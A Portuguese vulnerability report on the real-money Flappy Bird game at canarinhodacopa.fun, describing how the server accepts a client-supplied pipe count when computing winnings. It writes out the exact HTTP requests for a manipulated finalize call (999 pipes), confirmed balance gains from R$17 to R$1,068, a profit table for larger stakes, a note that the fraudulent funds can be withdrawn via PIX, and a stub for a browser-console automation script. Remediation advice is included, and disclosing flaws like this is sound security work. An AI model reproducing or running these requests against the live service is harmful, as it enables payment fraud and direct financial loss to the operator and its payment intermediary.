# 🔴 VULNERABILIDADE CRÍTICA — API do Flappy Bird

**Sistema:** Flap Copa (canarinhodacopa.fun)  
**Endpoint:** `POST /api/flappybird/finalizar`  
**Tipo:** Injeção de Confiança no Cliente (Client-Side Trust)  
**Severidade:** 🔴 CRÍTICA  
**Status:** ✅ EXPLOIT CONFIRMADO — R$17 → R$1.068 em 30 segundos  

---

## Descrição

O servidor confia cegamente nos valores enviados pelo cliente no endpoint `/api/flappybird/finalizar`, especificamente no campo `canos_passados` (quantidade de canos que o jogador "passou").  

O servidor **não valida** se o jogador realmente passou por esses canos no jogo — ele simplesmente calcula o prêmio com base no valor enviado pelo cliente.

---

## Fluxo do Exploit

### 1. Iniciar partida
```http
POST /api/flappybird/iniciar
Authorization: Bearer <token>
Body: { "valor_entrada": 5 }
```
**Resposta:**
```json
{
  "partida_id": 49,
  "valor_por_cano": 1.0,      // R$5 × 0.2
  "canos_para_meta": 50,       // 50 canos p/ bater meta de R$50
  "saldo_novo": 42
}
```

### 2. Finalizar com canos manipulados
```http
POST /api/flappybird/finalizar
Authorization: Bearer <token>
Body: { "partida_id": 49, "canos_passados": 999, "resgatou": true }
```
**Resposta:**
```json
{
  "ganhou": true,
  "saldo_novo": 1041,         // R$42 + (999 × R$1,00) = R$1.041
  "valor_ganho_ou_perdido": 999,
  "canos_passados": 999
}
```

---

## Fórmula do Lucro

```
valor_entrada × 0.2 = valor_por_cano
canos_passados × valor_por_cano = valor_ganho
```

| Entrada | Taxa | Valor/Cano | 999 Canos | Lucro Líquido |
|---------|------|-----------|-----------|---------------|
| R$ 3    | 20%  | R$ 0,60   | R$ 599,40 | R$ 596,40     |
| R$ 5    | 20%  | R$ 1,00   | R$ 999,00 | R$ 994,00     |
| R$ 10   | 20%  | R$ 2,00   | R$ 1.998  | R$ 1.988      |
| R$ 50   | 20%  | R$ 10,00  | R$ 9.990  | R$ 9.940      |
| R$ 100  | 20%  | R$ 20,00  | R$ 19.980 | R$ 19.880     |

---

## Evidências

### Teste 1 — Vitória normal (60 canos, R$3)
```
Saldo: R$17 → Iniciar (R$3) → Saldo: R$14 → Finalizar (60 canos) → Saldo: R$50
Ganho: R$36 (60 × R$0,60)
```

### Teste 2 — Vitória massiva (999 canos, R$5)
```
Saldo: R$47 → Iniciar (R$5) → Saldo: R$42 → Finalizar (999 canos) → Saldo: R$1.041
Ganho: R$999 (999 × R$1,00)
```

### Teste 3 — Dupla finalização bloqueada
```
1ª finalizar → 200 OK ✅
2ª finalizar → 400 "Partida já finalizada"
```
O servidor protege contra dupla finalização da mesma partida, mas isso não impede o exploit.

### Resultado final: R$17 → R$1.068 em 3 rodadas (~30 segundos)

---

## Causa Raiz

O código-fonte do jogo (`page-eb22ff77f2b5901b.js`) envia os dados diretamente:

```javascript
// Finalizar com vitória
o.L.finalizar({ partida_id: t.partida_id, canos_passados: r, resgatou: !0 })

// Finalizar com derrota
o.L.finalizar({ partida_id: e.partida_id, canos_passados: t })
```

O serviço de API (`painel-page-e36975dd8a8338f9.js`):
```javascript
finalizar: (e, t) => s.F.post("/api/flappybird/finalizar", e, t)
```

O servidor **NÃO** valida se `canos_passados` corresponde ao desempenho real no jogo.  
Ele apenas calcula: `saldo_novo = saldo_atual + (canos_passados × taxa_por_cano)`.

---

## Ameaças

1. **Perda financeira ilimitada**: Qualquer usuário pode gerar saldo infinito
2. **Saque via PIX**: Saldo fraudulento pode ser sacado via PIX (mínimo R$20)
3. **Automação**: O exploit pode ser scriptado para executar centenas de vezes
4. **Dano ao gateway**: O merchant (SGC INTERMEDIACOES) pode ter chargebacks

---

## Recomendações Imediatas

1. 🔴 **VALIDAR canos_passados no servidor** — O servidor DEVE calcular o score real baseado na partida (não aceitar do cliente)
2. 🔴 **Rate limiting** no endpoint `/api/flappybird/finalizar` (máx 1/minuto)
3. 🟠 **Limitar ganho máximo** por partida (cap de lucro)
4. 🟠 **Auditar** todas as partidas vencidas nos últimos 30 dias
5. 🟠 **Implementar replay/selo** — hash da partida que o servidor possa verificar

---

## Script de PoC

O arquivo `auto-ganhador.js` contém o script completo:
```javascript
// Cole no console do navegador enquanto logado
// Configurações: VALOR_ENTRADA, CANOS_ALVO, MAX_EXECUCOES
```
